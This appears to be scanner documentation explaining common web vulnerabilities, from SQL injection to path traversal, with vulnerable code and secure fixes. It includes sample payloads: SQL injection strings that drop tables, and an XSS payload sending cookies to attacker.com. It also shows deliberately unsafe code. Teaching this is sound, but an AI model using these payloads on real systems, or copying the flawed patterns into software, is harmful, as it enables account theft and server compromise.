Description: SQL Injection occurs when untrusted input is inserted into SQL queries without proper sanitization, allowing attackers to manipulate the query's logic or extract sensitive data.

Attack Vectors:
  • User input fields (login forms, search boxes)
  • URL parameters
  • HTTP headers
  • Cookie values
Example Attacks:

Vulnerable Query:

SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'

Malicious Input:

  • admin' -- (Bypasses password check)
  • admin' UNION SELECT * FROM credit_cards; -- (Data extraction)
  • admin'; DROP TABLE users; -- (Database manipulation)
Mitigation Strategies:
  • Use parameterized queries or prepared statements
  • Implement input validation and sanitization
  • Apply the principle of least privilege for database users
  • Use ORM frameworks with built-in SQL injection protection

Secure Implementation:

const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.execute(query, [username, password]);

Description: Cross-Site Scripting occurs when malicious scripts are injected into trusted websites. These scripts execute in the victim's browser under the security context of the vulnerable site, allowing attackers to steal sensitive information, hijack user sessions, or deface websites.

Types of XSS:
  • Reflected XSS: Malicious script is reflected off the web server in an error message or search result
  • Stored XSS: Malicious script is stored on the target server (e.g., in database)
  • DOM-based XSS: Vulnerability exists in client-side code rather than server-side code
Common Attack Vectors:

Vulnerable Code Examples:

// Reflected XSS
<p>Hello, <?= $_GET['name'] ?>!</p>

// Stored XSS
<div><?= $comment ?></div>

// DOM-based XSS
element.innerHTML = location.hash.substring(1);

Example Payloads:

  • <script>alert(document.cookie)</script>
  • <img src="x" onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
  • <svg onload="eval(atob('base64_encoded_payload'))">
Mitigation Strategies:
  • Context-aware output encoding
  • Input validation and sanitization
  • Content Security Policy (CSP) implementation
  • Use of modern frameworks with built-in XSS protection
  • HTTP-only cookies for sensitive data

Secure Implementation:

// Server-side encoding
<p>Hello, <?= htmlspecialchars($_GET['name'], ENT_QUOTES) ?>!</p>

// Client-side safe assignment
element.textContent = userInput;

// React's automatic escaping
function Welcome(props) {
  return <p>Hello, {props.name}!</p>;
}
Detection Methods:

VulnScan employs multiple techniques to detect XSS vulnerabilities:

  • Injection of special character sequences
  • Analysis of reflected input in responses
  • DOM manipulation checks
  • Evaluation of JavaScript execution contexts

Description: Broken Authentication occurs when weaknesses in authentication mechanisms allow attackers to compromise passwords, keys, session tokens, or exploit implementation flaws to assume other users' identities temporarily or permanently.

Common Vulnerabilities:
  • Weak password requirements
  • Weak session management
  • Credential stuffing attacks
  • Brute force attacks
  • Password recovery weaknesses
  • Missing multi-factor authentication
Attack Scenarios:

Vulnerable Implementation Examples:

// Weak Password Validation
function validatePassword(password) {
  return password.length >= 6;
}

// Insecure Session Management
session_id = Math.random().toString();
document.cookie = "sessionId=" + session_id;

// Vulnerable Password Reset
function resetPassword(email) {
  const tempPass = "reset123";
  sendEmail(email, tempPass);
}
Mitigation Strategies:
  • Strong Password Policy:
    • Minimum length of 12 characters
    • Mix of uppercase, lowercase, numbers, and special characters
    • Check against commonly used/compromised passwords
  • Secure Session Management:
    • Use cryptographically secure session IDs
    • Implement proper session timeout
    • Secure session storage and transmission
  • Multi-Factor Authentication (MFA):
    • Implement MFA for sensitive operations
    • Use secure MFA methods (TOTP, hardware tokens)
  • Rate Limiting:
    • Implement account lockout after failed attempts
    • Add CAPTCHA for login attempts

Secure Implementation:

// Strong Password Validation
function validatePassword(password) {
  const minLength = 12;
  const hasUpperCase = /[A-Z]/.test(password);
  const hasLowerCase = /[a-z]/.test(password);
  const hasNumbers = /\d/.test(password);
  const hasSpecialChar = /[!@#$%^&*]/.test(password);
  return password.length >= minLength &&
    hasUpperCase && hasLowerCase &&
    hasNumbers && hasSpecialChar;
}

// Secure Session Management
const session = {
  id: crypto.randomUUID(),
  created: Date.now(),
  expires: Date.now() + (30 * 60 * 1000) // 30 minutes
};

// Secure Password Reset
async function resetPassword(email) {
  const token = crypto.randomBytes(32).toString('hex');
  const expiry = Date.now() + (60 * 60 * 1000); // 1 hour
  await storeResetToken(email, token, expiry);
  await sendResetEmail(email, token);
}

Description: Sensitive Data Exposure occurs when an application does not adequately protect sensitive information such as financial data, healthcare information, or credentials. This data could be exposed in storage, during transmission, or through application behavior.

Common Types of Sensitive Data:
  • Passwords and authentication tokens
  • Credit card numbers and financial data
  • Personal identifiable information (PII)
  • Healthcare records (PHI)
  • Business secrets and intellectual property
  • Session tokens and cookies
Common Exposure Points:

Vulnerable Implementation Examples:

Mitigation Strategies:
  • Data Classification:
    • Identify and classify sensitive data
    • Apply appropriate protection levels
    • Implement data handling policies
  • Encryption:
    • Use strong encryption algorithms (AES-256, RSA)
    • Implement TLS 1.3 for data in transit
    • Secure key management practices
  • Access Controls:
    • Implement principle of least privilege
    • Regular access reviews
    • Audit logging of sensitive data access

Secure Implementation:

Description: CSRF attacks force authenticated users to execute unwanted actions on a web application in which they're currently authenticated. The attacker crafts a malicious request that inherits the identity and privileges of the victim to perform an undesired function on their behalf.

Common Attack Vectors:
  • Form submissions without CSRF tokens
  • State-changing GET requests
  • Missing or weak Same-Origin policies
  • Predictable form fields
  • Cookie-based session handling without additional protections

Vulnerable Implementation:

// Vulnerable API Endpoint @app.route('/transfer', methods=['POST']) def transfer_money(): to_account = request.form['to'] amount = request.form['amount'] return process_transfer(to_account, amount)
Mitigation Strategies:
  • CSRF Tokens:
    • Implement per-session or per-request tokens
    • Include tokens in forms and headers
    • Validate tokens on state-changing requests
  • SameSite Cookies:
    • Set SameSite=Strict for sensitive operations
    • Use SameSite=Lax as a minimum
  • Custom Headers:
    • Require custom headers for API requests
    • Validate Origin and Referer headers

Secure Implementation:

// Secure API Endpoint with CSRF Protection @app.route('/transfer', methods=['POST']) def transfer_money(): token = request.form.get('_csrf_token') if not token or token != session.get('_csrf_token'): abort(403) return process_transfer(request.form['to'], request.form['amount']) // Set Secure Cookie Configuration app.config.update( SESSION_COOKIE_SECURE=True, SESSION_COOKIE_HTTPONLY=True, SESSION_COOKIE_SAMESITE='Strict' )
Detection Methods:

VulnScan checks for CSRF vulnerabilities through:

Description: Remote Code Execution vulnerabilities allow attackers to execute arbitrary code on the target system. This is one of the most severe vulnerabilities as it can lead to complete system compromise, data theft, and service disruption.

Common Attack Vectors:
  • Unsafe deserialization of user input
  • Command injection in system calls
  • Template injection
  • Unsafe file uploads with executable content
  • Evaluation of user-controlled input
  • Vulnerable dependencies

Vulnerable Implementation:

# Command Injection Vulnerability @app.route('/ping') def ping_host(): host = request.args.get('host') result = os.system(f'ping -c 1 {host}') # Dangerous! return f"Ping result: {result}" # Unsafe Deserialization @app.route('/deserialize') def deserialize_data(): data = request.args.get('data') obj = pickle.loads(base64.b64decode(data)) # Dangerous! return {"deserialized": obj} # Template Injection @app.route('/template') def render_template_string(): template = request.args.get('template') return render_template_string(template) # Dangerous! # Unsafe Eval @app.route('/calculate') def calculate(): expr = request.args.get('expr') return str(eval(expr)) # Dangerous!
Mitigation Strategies:
  • Input Validation:
    • Strict input validation and sanitization
    • Whitelist allowed inputs
    • Use parameterized APIs
  • System Commands:
    • Avoid shell commands when possible
    • Use library functions instead of system calls
    • Implement command whitelisting
  • Serialization:
    • Use safe serialization formats (JSON)
    • Implement digital signatures
    • Validate data before deserialization

Secure Implementation:

# Safe Command Execution @app.route('/ping') def ping_host(): host = request.args.get('host') if not re.match(r'^[a-zA-Z0-9.-]+$', host): return "Invalid host", 400 try: result = subprocess.run( ['ping', '-c', '1', host], capture_output=True, timeout=5, check=True ) return result.stdout.decode() except subprocess.SubprocessError: return "Ping failed", 500 # Safe Deserialization @app.route('/deserialize') def deserialize_data(): try: data = request.args.get('data') # Use safe serialization format obj = json.loads(data) return {"deserialized": obj} except json.JSONDecodeError: return {"error": "Invalid JSON"}, 400 # Safe Template Handling @app.route('/template') def render_safe_template(): template_name = request.args.get('template') if template_name not in ALLOWED_TEMPLATES: return "Template not allowed", 403 return render_template(template_name) # Safe Calculation @app.route('/calculate') def calculate(): expr = request.args.get('expr') try: # Use safe evaluation library result = ast.literal_eval(expr) return str(result) except (ValueError, SyntaxError): return "Invalid expression", 400

Description: Directory Traversal (also known as Path Traversal) allows attackers to access files and directories outside of the web root folder. By manipulating variables that reference files with "../" sequences and similar techniques, attackers can access arbitrary files on the server.

Common Attack Vectors:
  • File download/upload functionality
  • Static resource inclusion
  • Log file access
  • Configuration file reading
  • Template loading

Vulnerable Implementation:

# Vulnerable file access @app.route('/download') def download_file(): filename = request.args.get('file') return send_file(filename) # Dangerous! # Vulnerable template loading @app.route('/page') def load_page(): page = request.args.get('name') return render_template(page) # Dangerous! # Vulnerable file reading @app.route('/logs') def view_logs(): log_file = request.args.get('file') with open(log_file, 'r') as f: # Dangerous! return f.read()
Mitigation Strategies:
  • Input Validation:
    • Validate file paths against whitelist
    • Remove or encode path traversal sequences
    • Use canonical path resolution
  • Access Controls:
    • Implement proper file permissions
    • Use chroot jails where applicable
    • Restrict file system access
  • Safe APIs:
    • Use security-focused file handling libraries
    • Implement safe file access wrappers
    • Use absolute paths with proper validation

Secure Implementation:

import os from pathlib import Path # Secure file access with path validation @app.route('/download') def download_file(): filename = request.args.get('file') if not filename or '..' in filename: return "Invalid filename", 400 safe_path = os.path.join(app.config['UPLOAD_FOLDER'], filename) if not os.path.abspath(safe_path).startswith( os.path.abspath(app.config['UPLOAD_FOLDER']) ): return "Access denied", 403 return send_file(safe_path) # Secure template loading @app.route('/page') def load_page(): page = request.args.get('name') if page not in ALLOWED_TEMPLATES: return "Template not found", 404 return render_template(page) # Secure file reading with path validation @app.route('/logs') def view_logs(): log_file = request.args.get('file') log_dir = Path(app.config['LOG_FOLDER']) try: file_path = log_dir.joinpath(log_file).resolve() if not str(file_path).startswith(str(log_dir)): raise ValueError("Invalid path") return file_path.read_text() except (ValueError, OSError): return "Access denied", 403

  • CSP Header Configuration:
    • Define trusted sources for content
    • Restrict inline scripts and styles
    • Configure reporting endpoints
  • Resource Management:
    • Use nonces for inline scripts
    • Implement hash validation
    • Control external resources
  • Policy Enforcement:
    • Enable strict dynamic mode
    • Implement report-only mode
    • Monitor policy violations
